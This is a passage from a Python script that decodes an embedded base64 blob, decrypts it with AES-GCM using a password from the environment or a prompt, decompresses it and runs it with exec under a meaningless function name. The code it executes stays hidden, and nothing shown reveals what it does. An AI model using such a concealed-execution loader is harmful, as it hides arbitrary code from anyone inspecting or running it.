SL3udqsuGNKC96XdVUzKybZHO1+vbbVjMCDS6oxXOBCTnoamSA2Fz4UROZqIrSRsBNcrl5IBkXmDx3mvEp6CfJFNg9c46hvYFokgKBlkH+gsTIDgEs8H8kC2ELro3jEIncu63OF0QS63BZo2hLRN5dtoQS+bvRHcN17nNK0PahsCYnOWJ+YBE1IMjDPQ58f5h6hPa70kcNOaG8ldPEZUYGM+O+wwAYgObLCDjPSKKg/GWqoneYivj6E02IrAANazHIVF6C6mE6BJxsnqRwnaECCMrAe0CjldrdZraLUbqNLe6us7ssxhhGOe7SRezgKw0sQQ3T8BQwA4caIhpa05J8tipvzW0zK7Fn/1f9LGU0xoGOGNGDWhFz9RYvqMDlwQNGC7qIBqA78mrEqfc5Vb804iVal2075PM6y1ZH4e/k+BlNT5tYOtdsHz+CmzN02z497G6+NAlhn3AzJtuiSUu0elZTLrBPW3ALjTIM6lYXT7jqtkjb7ozMEEGIwy4sc/dr4cP4i7Q8r0I2ZN0Pw+UGbLSoyhHe0HCrcUUMTZ7YJ2tz2lNX/JoHow99GiToEb4gVvFw9tlkqg3dKtu46BHF4mPEct+QGPSEv8Y9Spx0T3gBMNU+/7dYceVR+0HbBYq5dQIGqfv/4zMkOe+It1E1cUgVzqXA9p/1f2ayohnA+GFa0cvmQOuy6cXZuUkCQKXcjOVQq6PZt5kZIgkMfVXvCs9qlJ3yVNDEgWpngPqzbXIL/cFrKPpV/7+U9c6vXx+BTU3G7PEB/xSUlvKHTEij01uJgcf2yFJ42C/1+ezQy4IWXdrVVCcpN5LxIwSzhJjGUZX/YEEWxczVCRd5r0AsrPHi4pZNfEb/JdVnrj4KzwVplwFOXObqHu0OQ1jtE3W/VHyNqzqNvYAG3f1O6y82j5+XrKjpNw=='
        payload = base64.b64decode(b64_data)
        
        pos = 0
        integrity_hash = payload[pos:pos+16]
        pos += 16
        
        salt = payload[pos:pos+SALT_LEN]
        pos += SALT_LEN
        
        nonce = payload[pos:pos+16]
        pos += 16
        
        tag = payload[pos:pos+16]
        pos += 16
        
        ciphertext = payload[pos:]
        
        pw = os.getenv("SCRIPT_KEY")
        if not pw:
            pw = getpass.getpass("Enter password: ")
        
        if hashlib.sha256(pw.encode()).digest()[:16] != integrity_hash:
            print("Error: Invalid password")
            sys.exit(1)
        
        key = derive_key_from_pass(pw, salt)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        
        try:
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        except ValueError as e:
            print("Error: Wrong Password")
            print("This usually means wrong password or corrupted data")
            sys.exit(1)

        code = multi_decompress(decrypted)
        exec(code, globals())
        
    except Exception as e:
        print(f"Error: {type(e).__name__}: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    coophalco()
